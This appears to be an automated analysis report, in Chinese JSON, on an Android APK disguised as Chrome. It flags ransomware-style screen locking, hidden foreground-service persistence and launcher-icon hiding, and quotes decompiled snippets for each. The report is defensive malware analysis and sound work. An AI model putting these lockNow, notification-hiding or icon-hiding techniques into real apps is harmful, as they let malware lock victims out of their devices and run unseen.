@@ -1,0 +1,118 @@
+{
+  "APK信息": {
+    "文件名": "c65318aa58c9091b938948b62c4b5d6e47237697d8d2f96863f99ef177b6818d.apk",
+    "sha256": "c65318aa58c9091b938948b62c4b5d6e47237697d8d2f96863f99ef177b6818d",
+    "包名": "ghd.et.hds",
+    "应用名": "Chrome",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 83.7
+  },
+  "行为列表": [
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "device_lock",
+          "中文名": "设备锁屏",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "lockNow"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\a;",
+          "method_signature": "if(i2 >= 70)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "systemService.getClass().getMethod(\"lockNow\", new Class[0]).invoke(systemService, new Object[0]);",
+          "malicious_code_snippet_context": "                          return;\n                      }\n                      try {\n>>>                         systemService.getClass().getMethod(\"lockNow\", new Class[0]).invoke(systemService, new Object[0]);\n                          Thread.sleep(99L);\n                      } catch (Exception e) {\n                          e.printStackTrace();",
+          "behavior_description": "代码在循环中通过反射机制调用系统服务（通常是DevicePolicyManager）的lockNow方法，强制锁定设备屏幕，导致用户无法正常使用设备，属于典型的勒索软件锁屏行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\das\\hfCancelNoticeService;",
+          "method_signature": "if(Build.VERSION.SDK_INT > 18)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "if (Build.VERSION.SDK_INT > 18) { Notification.Builder builder = new Notification.Builder(this); builder.setSmallIcon(R.mipmap.icon); startForeground(vgMainService.a, builder.build()); new Thread(new Runnable() { public void run() { try { hfCancelNoticeService.this.a(); ((NotificationManager) hfCancelNoticeService.this.getSystemService(\"notification\")).cancel(vgMainService.a); hfCancelNoticeService.this.stopSelf(); } catch (Exception e) { e.printStackTrace(); } } }).start(); }",
+          "malicious_code_snippet_context": "if (Build.VERSION.SDK_INT > 18) { Notification.Builder builder = new Notification.Builder(this); builder.setSmallIcon(R.mipmap.icon); startForeground(vgMainService.a, builder.build()); new Thread(new Runnable() { public void run() { try { hfCancelNoticeService.this.a(); ((NotificationManager) hfCancelNoticeService.this.getSystemService(\"notification\")).cancel(vgMainService.a); hfCancelNoticeService.this.stopSelf(); } catch (Exception e) { e.printStackTrace(); } } }).start(); }",
+          "behavior_description": "该服务通过 startForeground 启动前台服务提升进程优先级以避免被系统杀死，随后在新线程中执行 a() 方法，并立即取消通知图标（cancel）使前台服务对用户不可见，最后调用 stopSelf。这是一种典型的前台服务保活技巧：利用 startForeground 获得前台优先级保活，同时通过 cancel 隐藏通知，用户无感知。在恶意样本中，此机制为恶意服务持续运行提供保障。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\fde\\gsActivity;",
+          "method_signature": "run()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "gsActivity.this.getPackageManager().setComponentEnabledSetting(new ComponentName(gsActivity.this.getPackageName(), gsActivity.class.getName()), 2, 1);",
+          "malicious_code_snippet_context": "              @Override // java.lang.Runnable\n              public void run() {\n                  try {\n>>>                     gsActivity.this.getPackageManager().setComponentEnabledSetting(new ComponentName(gsActivity.this.getPackageName(), gsActivity.class.getName()), 2, 1);\n                  } catch (Exception e) {\n                      e.printStackTrace();\n                  }",
+          "behavior_description": "在 Activity 的 onCreate 中通过匿名 Runnable 调用 PackageManager.setComponentEnabledSetting，将自身 Activity 组件设置为 COMPONENT_ENABLED_STATE_DISABLED(2)，使应用图标从启动器中隐藏，让用户误以为应用已卸载，但恶意进程仍在后台运行。数据流向：getPackageName()/gsActivity.class.getName() → setComponentEnabledSetting(..., 2, 1)",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
